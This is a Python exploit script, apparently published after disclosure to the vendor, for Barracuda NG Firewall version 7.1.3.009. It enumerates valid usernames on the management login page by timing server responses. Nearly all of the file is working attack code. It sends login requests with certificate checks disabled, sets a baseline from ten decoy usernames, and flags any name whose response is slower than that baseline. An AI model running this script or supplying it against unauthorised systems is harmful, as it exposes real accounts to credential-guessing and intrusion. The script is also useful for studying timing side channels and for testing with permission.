#!/usr/bin/python
#
# Exploit Title: Barracuda NG Firewall - Side Channel Username Enumeration
# Date: 03/14/2018
# Exploit Author: Ismael Goncalves
# Vendor Homepage: https://barracuda.com/
# Software Link: N/A
# Version: 7.1.3.009 (and probably below)
# Tested on: Linux
# CVE : N/A (Vendor stated 'Won't fix' due Low Risk 
# Disclosed to Vendor: 09/13/2017
# Authorization from Vendor for publication: 01/16/18
# Description: By observing observing response times when submiting authentication requests to the management interface of the device it is possible to observe whenever a valid user
#              exists it takes more time before we see the first byte of the response. This could be leveraged to perform user enumeration using this side channel.
#
# Usage Sample: python barracuda_fw_userenum.py -u list.txt -U user -t "https://target:8000/cgi-mod/index.cgi" -p 
# "enc_key=7c07bedcfb2ad755671b20b81f842ca2&et=1505089322&password=Ic9AIQ%3D%3D&enctype=bc&password_entry=&login_page=1&login_state=out&real_user=&locale=en_US&form=f&Submit=Sign in"
#
# The 10 first users of the target username list should be something random and not valid - used just for mesuring response times
#


try:
	import pycurl
except:
	print('Error importing pyCurl module')
	quit()
try:
    # python 3
    from urllib.parse import urlencode
except ImportError:
    # python 2
    from urllib import urlencode

import json
import time
from StringIO import StringIO
import argparse

def parse_args():

	# Parsing CLI arguments
	sample = "Sample: python barracuda_userenum.py -u users.txt -U user -t 'https://sometarget.com' -p 'password=randompass&Submit=ok'"
	parser = argparse.ArgumentParser(description='''Barracuda NG Firewall - Side Channel User Enumeration 
	Written by: Ismael Goncalves''', prog="barracuda_userenum.py", epilog=sample,formatter_class=argparse.RawDescriptionHelpFormatter)

	parser.add_argument("-u", "--usrlist", help="File containing list of users", required=True) 
	parser.add_argument("-U", "--usrfield", help="Field from Form data identifying user" , required=True)
	parser.add_argument("-t", "--target", help="Target URL with protocol (e.g. https://sometarget.com)", required=True)
	parser.add_argument("-p", "--post", help="Form data without usrfield", required=True)
	parser.add_argument("-H", "--header", help="Additional header", action='append')
	args = parser.parse_args()

	return args

# User-Agent
ua = 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)'

# Verbose
verbose = 0

def perform_curl(user_name,args):
	time.sleep(1)
	file = args.usrlist
        user_field = args.usrfield
        url = args.target
        post_data = args.post
        headersList = args.header

	c = pycurl.Curl()
	storage = StringIO()
        # concatenate username field at the end of the form data
        postfields = post_data + "&" + user_field + "=" + user_name

        c.setopt(c.SSL_VERIFYPEER, False)
       	c.setopt(c.SSL_VERIFYHOST, False)
	c.setopt(c.VERBOSE, verbose)
        c.setopt(c.USERAGENT, ua)
        c.setopt(c.URL, url)
        c.setopt(c.HTTPHEADER, headersList)
        c.setopt(c.POSTFIELDS, postfields)
        c.setopt(pycurl.WRITEFUNCTION, lambda x: None)
        c.setopt(c.HEADERFUNCTION, storage.write)
        c.perform()
	print user_name
	return format(c.getinfo(c.STARTTRANSFER_TIME) - c.getinfo(c.PRETRANSFER_TIME))

def exploit(args):
	# holds average time
	avg = 0.0
	# amount of transactions
	sum = 0.0
	# counter
	count = 0
	# limit to test invalid users
	limit = 10
        # non-valid users list
	# target % time more - 1.15 for 15% 1.10 for 10%
	target = 1.110
	# times
	times = []

	file = args.usrlist

        print 'Barracuda NG Firewall - Side Channel Username Enumeration\n'

	with open(file) as f:
		for line in f:
			t = perform_curl(line.rstrip("\n"),args)
			count += 1
			sum += float(t)
			avg = (sum/count)
			times.append(float(t))
			if count >= limit:
				print times
				print avg
				avg = (sum - min(times) - max(times)) / (limit -2)
				print avg
				break

		target = avg * target
		print "TARGET response time: " + str(target)

		# Resume testing...
		for line in f:
        	        t = perform_curl(line.rstrip("\n"),args)
			print t
			if float(t) >= target: print line + " Potential USER"

def main():
	args = parse_args()
	exploit(args)

if __name__ == "__main__":
    main()
